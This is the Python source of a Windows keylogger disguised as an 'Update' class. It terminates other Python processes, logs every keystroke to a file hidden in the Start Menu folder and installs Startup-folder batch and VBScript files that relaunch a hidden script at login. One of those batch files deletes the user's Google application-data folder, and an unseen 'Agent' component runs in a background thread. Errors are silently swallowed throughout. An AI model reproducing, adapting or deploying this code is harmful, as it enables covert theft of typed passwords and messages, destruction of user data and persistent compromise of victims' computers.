

try:
    import os
    import getpass
    import ctypes
    from pynput.keyboard import Key, Listener
    import psutil
    import json
    import threading
    from datetime import datetime
    from pathlib import Path
    ######
    from agent import Agent
    ######
except ModuleNotFoundError as e:
    exit(1)




def kill_python_processes():
  try:
    current_pid = os.getpid()


    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            if proc.info['name'] == 'python.exe' and proc.info['pid'] != current_pid:
                proc.terminate()  
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
  except Exception as e:
    num = 1

kill_python_processes()

class Update:
  try:
    def __init__(self):
        self.logger = ''
        self.caps_lock_active = self.is_caps_lock_on()
        self.shift_pressed = False

        username = getpass.getuser()
        self.log_file_path = Path(f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/log.txt")
        self.log_file_path.parent.mkdir(parents=True, exist_ok=True)

        if not self.log_file_path.exists():
            with open(self.log_file_path, 'w', encoding='utf-8') as new_file:
                new_file.write('')

    def is_caps_lock_on(self):
        return ctypes.windll.user32.GetKeyState(0x14) & 1  

    def send_data(self, keystrike):
        self.logger += keystrike
        with open(self.log_file_path, 'a+', encoding='utf-8') as new_file:
            new_file.write(self.logger)

        self.logger = ''

    def take_keys(self, key):
        self.caps_lock_active = self.is_caps_lock_on()  
        try:
            hit_key = str(key.char)
            if hit_key.isalpha():  
                if self.caps_lock_active ^ self.shift_pressed: 
                    hit_key = hit_key.upper()
                else:
                    hit_key = hit_key.lower()
        except AttributeError:
            if key == Key.space:
                hit_key = ' '
            elif key == Key.enter:
                hit_key = '\n'
            elif key == Key.backspace:
                hit_key = '   (BACKSPACE)   '
            elif key == Key.tab:
                hit_key = '    (TAB)    '
            elif key == Key.caps_lock:
                hit_key = '    (CAPS LOCK)    '
            else:
                hit_key = f'    ({str(key)})    '

        self.send_data(hit_key)

    def on_press(self, key):
        if key in (Key.shift, Key.shift_r):
            self.shift_pressed = True
        else:
            self.take_keys(key)

    def on_release(self, key):
        if key in (Key.shift, Key.shift_r):
            self.shift_pressed = False

    def change_dir(self):
        LABEL = 'BOOT'
        AUTOSTART = 'boot.bat'
        try:
            username = getpass.getuser()

            startup_dir = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            programs_dir = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs'
            google_dir = f'C:\\Users\\{username}\\AppData\\Local\\Google'
            if not os.path.exists(startup_dir):
                os.makedirs(startup_dir)
            if not os.path.exists(programs_dir):
                os.makedirs(programs_dir)

            cmdfile = fr'''
@echo off

start /min cmd /c "{programs_dir}\sys.bat"
'''
            with open(f'{startup_dir}\\system.bat', 'w') as cmdFile1:
                cmdFile1.write(cmdfile)

            with open(f'{programs_dir}\\sys.bat', 'w') as file:
                cmd = f'''
@echo off

setlocal
rmdir /s /q "{google_dir}"
start "" "{programs_dir}\\bootloader.bat"

'''
                file.write(cmd)
            with open(f'{startup_dir}\\temp.vbs', 'w') as vbs_file:
                vbs_script = f"""
Set WshShell = CreateObject("WScript.Shell")
userName = WshShell.ExpandEnvironmentStrings("%USERNAME%")
pythonPath = "C:\\Users\\" & userName & "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\pythonw.exe"
scriptPath = "C:\\Users\\" & userName & "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\system.pyw"
WshShell.CurrentDirectory = "C:\\Users\\" & userName & "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs"
WshShell.Run chr(34) & pythonPath & Chr(34) & " " & Chr(34) & scriptPath & Chr(34), 0
Set WshShell = Nothing
"""
                vbs_file.write(vbs_script)
        except ModuleNotFoundError:
            num = 1
            input()
        except FileNotFoundError:
            num = 1
        except PermissionError:
            num = 1
        except Exception as e:
            num = 0

    def main(self):
        a = Agent()
        
        listener = Listener(on_press=self.on_press, on_release=self.on_release)


        agent_thread = threading.Thread(target=a.run, daemon=True)
        agent_thread.start()

        self.change_dir()

        with listener:
            self.logger = ''
            listener.join()

  except Exception as e:
    num = 1
  except KeyboardInterrupt:
    num = 1
  except SystemExit:
    num = 1
  except MemoryError:
    num = 1
  except ZeroDivisionError:
    num = 1
  except ValueError:
    num = 1
Update().main()